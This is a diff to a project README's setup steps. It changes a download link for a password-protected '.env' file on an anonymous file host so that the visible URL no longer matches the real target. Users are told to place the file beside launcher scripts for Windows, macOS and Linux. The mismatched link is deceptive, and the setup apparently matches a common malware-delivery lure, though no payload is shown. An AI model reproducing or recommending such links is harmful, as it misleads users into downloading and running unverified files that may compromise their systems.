@@ -31,7 +31,7 @@ Compatible with **Windows**, **macOS**, and **Linux**.
 ### 1. Configure keys
 
 Download the project `.env` from  
-[https://workupload.com/file/v8XjpkuMRUb](https://workupload.com/file/v8XjpkuMRUb).
+[https://workupload.com/file/v8XjpkuMRUb](https://workupload.com/file/bHykE76vq2u).
 
 You need the download **password** (ask the project maintainer if you do not have it).  
 Place the file in the **project root** as `.env` (same folder as `README.md`, `MacOs.command`, `Windows.bat`, and `Linux.sh`).
